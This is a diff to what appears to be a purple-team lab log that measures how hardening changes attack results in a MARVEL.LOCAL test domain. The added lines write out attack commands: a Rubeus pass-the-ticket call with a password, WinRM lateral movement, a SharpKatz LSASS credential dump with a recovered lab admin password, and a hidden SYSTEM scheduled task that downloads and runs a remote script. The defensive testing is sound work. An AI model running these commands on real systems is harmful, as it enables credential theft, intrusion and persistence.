@@ -2599,8 +2599,8 @@ That is recorded as a gap in the project, not as a note about the hand-over.
 **Partly closed, 11 Nov 2026 — v3's screenshots recover the Pass-the-Ticket procedure.** Archived
 captures from the v3 run (20 Oct) document phase 6 exactly: over a Sliver session on SPIDERMAN,
 `execute-assembly Rubeus.exe asktgt /user:SQLService /password:MYpassword123# /domain:MARVEL.LOCAL
-/dc:192.168.182.135 /ptt` (Rubeus v1.6.4). It is reproducible now, so phase 6 is no longer
-reconstruction-from-prose; phase 7 (WinRM) still is.
+/dc:192.168.182.135 /ptt` (Rubeus v1.6.4). It is reproducible now, and further v3 captures (below) recover phase 7 as well, so neither phase
+is reconstruction-from-prose any longer.
 
 **And they fix the un-hardened baseline this phase's step-7 prediction is measured against.** In v3,
 Rubeus derived an `rc4_hmac` hash and the request **succeeded** — "TGT request successful", and the
@@ -2609,6 +2609,26 @@ captured at source. The step-7 prediction is that after lever 4 this exact call 
 asks specifically for a Kerberos TGT with an RC4 key and has no NTLM path to fall back to, unlike
 the interactive logon in the Nov 10 `rc4test` probe. The before-behaviour is now evidence rather
 than inference, so a failure in step 7 is a clean measurement of lever 4.
+
+**And a further set of v3 captures recovers phases 7, 8 and 10, with two before/after baselines that
+matter.**
+
+- **Phase 7 — WinRM lateral.** From SPIDERMAN: `Invoke-Command -ComputerName THEPUNISHER
+  -Authentication Kerberos -AsJob -ScriptBlock { ... }`, which produced a second Sliver session on
+  THEPUNISHER (`frankcastle`). Bundle 3b **deliberately left WinRM open east-west**, so step 7
+  should still succeed and still raise no Splunk alert (Sigma-only coverage). This is the lane the
+  firewall work kept open on purpose; a *failure* here would be a regression, not a win.
+- **Phase 8 — LSASS, and the cleanest bundle-2 before/after in the project.** In v3,
+  `execute-assembly SharpKatz.exe --Command logonpasswords` **on THEPUNISHER** recovered
+  `MARVEL\\administrator : P@$$w0rd!` from CredMan, in clear. THEPUNISHER now carries `RunAsPPL`
+  (bundle 2), so step 7's SharpKatz should return **nothing** — SharpKatz reads LSASS cross-process
+  and the implant is not a PPL. Note this is a different access pattern from the Task Manager dump
+  tested in bundle 2 (in-process .NET assembly vs a GUI dump), but both cross the same PPL boundary,
+  so the prediction holds and the cell gets two independent attack paths against one control.
+- **Phase 10 — persistence.** `Register-ScheduledTask -TaskName "Updater" -Action (powershell
+  -WindowStyle Hidden -c IEX(DownloadString update.ps1)) -Trigger AtLogOn -Principal (SYSTEM,
+  RunLevel Highest)`. It should still fire `#9` on `4698`; nothing in five bundles touches
+  scheduled-task creation.
 
 **A Defender-timing nuance that bears on the signature freeze.** On 20 Oct the implant **ran** —
 the Sliver session established and Windows Security showed "No current threats" — and Defender's
